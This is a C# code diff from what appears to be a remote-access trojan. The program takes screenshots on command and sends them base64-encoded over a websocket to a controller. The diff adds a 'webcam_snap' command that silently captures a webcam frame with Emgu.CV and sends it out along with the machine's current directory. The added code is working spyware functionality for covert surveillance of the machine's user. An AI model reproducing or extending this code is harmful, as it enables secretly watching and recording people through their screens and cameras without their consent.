@@ -6,6 +6,8 @@ using System.Drawing;
 using System.IO;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
+using Emgu.CV;
+
 namespace A3
 {
     class Program
@@ -32,9 +34,18 @@ namespace A3
                         memoryImage.Save(stream, ImageFormat.Bmp);
                         byte[] imageBytes = stream.ToArray();
                         string base64String = Convert.ToBase64String(imageBytes);
-                        ws.Send("uploading screenshot (may exceed 10mo, please be patient)...");
-                        ws.Send("##SCREENSHOT##");
-                        ws.Send(base64String);
+                        ws.Send("##SCREENSHOT##"+ base64String);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else if(message == "webcam_snap")
+                    {
+                        VideoCapture capture = new VideoCapture();
+                        Bitmap image = capture.QueryFrame().Bitmap;
+                        MemoryStream ms = new MemoryStream();
+                        image.Save(ms, ImageFormat.Jpeg);
+                        byte[] byteImage = ms.ToArray();
+                        var SigBase64 = Convert.ToBase64String(byteImage);
+                        ws.Send("##WEBCAM_SNAP##"+SigBase64);
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                     }
                     else
